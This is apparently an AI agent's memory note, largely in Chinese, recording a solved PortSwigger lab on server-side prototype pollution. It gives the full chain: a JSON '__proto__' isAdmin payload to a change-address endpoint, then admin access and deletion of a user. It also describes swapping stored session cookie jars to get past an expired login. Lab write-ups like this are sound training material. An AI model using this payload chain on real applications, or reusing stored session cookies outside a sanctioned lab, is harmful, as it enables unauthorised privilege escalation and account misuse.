---
metadata:
  node_type: memory
name: "prs-arm-a-lab-privilege-escalation-via-server-side-prototype-pollution"
description: "arm A:lab-privilege-escalation-via-server-side-prototype-pollution 一次通过;发射钥匙 /tmp/cj1.json 失效时改用 /tmp/e1-lab2.json(同会话 CookiesC1/C2);利用链 __proto__.isAdmin → /admin → delete carlos"
last_updated: 2026-10-10T00:12:17+08:00
created: 2026-10-10T00:12:17+08:00
---

主题:arm A 实录(2026-10-10)

- 题:portswigger/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution。
- page_read 取 widget-lab-id `59D3F1AF...FE37`;题面正文即方法(节点 Express 不安全 merge;污染属性经原型链在 HTTP 响应可见)。
- 实例:range_launch launch 59d3f1af... --jar /tmp/cj1.json → https://0afe0097045e390380fa94ac00410050.web-security-academy.net/(reused:false)。

环境坑(本次最大摩擦,值得沉淀):
- 会话启动时 /tmp/cj1.json 里的 portswigger.net .AspNetCore.CookiesC1/C2 已失效:launch 三连落 login.portswigger.net;`http_dump /users/youraccount` 回 302 `/users?returnurl=...` = 明确未登录判据。
- 同源可用钥匙:磁盘上并存两个会话变体;`/tmp/e1-lab2.json`(= `/tmp/b28-jar3.json`,C1 前缀 `CfDJ8PsPv_RZvwZLmfsMuefKRiO8RWQD...`)仍是活会话——`/users/youraccount` 回 302 `Location: /users/youraccount/licenses`(已登录,被重定向到子页),而陈旧变体(`/tmp/cc-jar.json`,前缀 `...Pjj-P991c8`)回 `Location: /users?returnurl=`,两者可据此区分。故 cp e1-lab2.json → cj1.json 后 launch 直达。
- 教训:发射失败先做一次 `/users/youraccount` 探针判定会话死活,再换 jar;`Location` 是 `/users?...` 即死、是 `/users/youraccount/...` 即活。

利用链(件的调用序列):
1. http_session get / → 取实例 `session` cookie(range_launch 已写回 jar)。
2. http_session get /login → csrf `kDji97L8GWNoVnJb100XDXOK0tWt2wTg`(表单是 jsonSubmit,POST 体为 JSON)。
3. http_session post /login,`Content-Type: application/json`,体 `{"csrf":..,"username":"wiener","password":"peter"}` → 302 `/my-account?id=wiener`,Set-Cookie 轮换 session。
4. 基线 http_session post /my-account/change-address(JSON,含 sessionId)→ 200 `{"username":"wiener",...,"isAdmin":false}`(响应即状态面)。
5. 投毒:同端点同方法,体追加 `"__proto__":{"isAdmin":true}` → 200 `... "isAdmin":true`(继承态可见 = 污染成立)。
6. http_session get /admin → 200 用户表(wiener/carlos)。
7. http_session get `/admin/delete?username=carlos` → 302 `/admin`;banner_verdict → solved:true + `<h4>Congratulations, you solved the lab!</h4>`。

- 未读题解/未读族注与本方既有档案;全 HTTP 走件;未 git 提交。

